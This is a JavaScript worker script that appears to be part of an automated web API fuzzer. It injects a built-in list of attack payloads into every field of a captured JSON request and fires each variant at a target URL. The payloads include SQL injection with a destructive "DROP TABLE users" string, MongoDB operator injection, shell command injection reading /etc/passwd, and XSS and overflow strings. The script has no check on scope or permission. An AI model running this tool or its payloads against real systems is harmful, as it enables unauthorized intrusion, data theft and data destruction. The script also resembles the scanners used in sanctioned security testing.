const { parentPort, workerData } = require('worker_threads');
const axios = require('axios');

const { originalReq, targetUrl } = workerData;

// aggressive_payloads.js content effectively
const ATTACK_VECTORS = [
    // 1. SQL Injection
    { type: 'SQLi', payload: "' OR '1'='1" },
    { type: 'SQLi', payload: "'; DROP TABLE users; --" },
    { type: 'SQLi', payload: "' UNION SELECT 1, version(), 3 --" },

    // 2. NoSQL Injection (MongoDB)
    { type: 'NoSQLi', payload: { "$ne": null } },
    { type: 'NoSQLi', payload: { "$gt": "" } },
    { type: 'NoSQLi', payload: { "$where": "sleep(1000)" } },

    // 3. Command Injection (RCE)
    { type: 'CMDi', payload: "; ls -la" },
    { type: 'CMDi', payload: "`cat /etc/passwd`" },
    { type: 'CMDi', payload: "|| ping -c 10 127.0.0.1" },

    // 4. XSS (Stored)
    { type: 'XSS', payload: "<script>alert('HACKED')</script>" },
    { type: 'XSS', payload: "\"><img src=x onerror=alert(1)>" },

    // 5. Overflow / Fuzzing
    { type: 'Overflow', payload: "A".repeat(5000) },
    { type: 'FormatString', payload: "%s%s%s%s%s" }
];

let requestsSent = 0;
let vulnerabilitiesFound = 0;

// Helper: Deep Clone
const clone = (obj) => JSON.parse(JSON.stringify(obj));

// Recursive Mutator
function generateMutations(obj, path = '') {
    const mutations = [];

    // If it's an object or array, recurse
    if (typeof obj === 'object' && obj !== null) {
        for (const key in obj) {
            const newPath = path ? `${path}.${key}` : key;
            const value = obj[key];

            // 1. Recurse deeper
            mutations.push(...generateMutations(value, newPath));

            // 2. Mutate THIS field (strings/numbers/booleans/nulls)
            // We verify it's a primitive or we want to replace the whole object/array container too
            ATTACK_VECTORS.forEach(vector => {
                // Clone the ROOT object
                const mutatedRoot = clone(workerData.originalReq.body);

                // Navigate to the exact spot and inject payload
                setByPath(mutatedRoot, newPath, vector.payload);

                mutations.push({
                    mutationType: vector.type,
                    field: newPath,
                    payload: vector.payload,
                    body: mutatedRoot
                });
            });
        }
    }

    return mutations;
}

// Helper: Set value by string path "user.address.zip"
function setByPath(obj, path, value) {
    const parts = path.split('.');
    let current = obj;
    for (let i = 0; i < parts.length - 1; i++) {
        current = current[parts[i]];
    }
    current[parts[parts.length - 1]] = value;
}

const runAttack = async () => {
    // 1. Generate All Possible Mutations
    const mutations = generateMutations(originalReq.body);
    parentPort.postMessage({ status: 'info', message: `Generated ${mutations.length} distinct mutation payloads.` });

    // 2. Fire Requests
    for (const mutation of mutations) {
        try {
            const start = Date.now();
            const res = await axios({
                method: originalReq.method,
                url: targetUrl,
                headers: {
                    ...originalReq.headers,
                    'X-Mutation-Type': mutation.mutationType,
                    'Content-Type': 'application/json' // Force JSON
                },
                data: mutation.body,
                validateStatus: () => true, // Don't throw on 500
                timeout: 3000
            });
            const duration = Date.now() - start;

            requestsSent++;

            // Heuristic Analysis: Did we break it?
            let isSuspicious = false;

            // 500 Errors are dead giveaways
            if (res.status >= 500) isSuspicious = true;

            // Slow response (Blind SQLi / DoS)
            if (duration > 2000) isSuspicious = true;

            // Reflected Payload (XSS Check - Simple)
            if (typeof res.data === 'string' &&
                typeof mutation.payload === 'string' &&
                res.data.includes(mutation.payload)) {
                isSuspicious = true;
            }

            if (isSuspicious) {
                vulnerabilitiesFound++;
                parentPort.postMessage({
                    status: 'vulnerability',
                    data: {
                        type: mutation.mutationType,
                        field: mutation.field,
                        status: res.status,
                        duration,
                        payload: mutation.payload
                    }
                });
            }

            // Report progress every 10 requests
            if (requestsSent % 10 === 0) {
                parentPort.postMessage({
                    status: 'progress',
                    sent: requestsSent,
                    total: mutations.length
                });
            }

            // Small delay to prevent complete network choke
            await new Promise(r => setTimeout(r, 20));

        } catch (err) {
            // Network errors (connection refused)
        }
    }

    parentPort.postMessage({ status: 'done', totalSent: requestsSent, vulnerabilitiesFound });
};

runAttack();
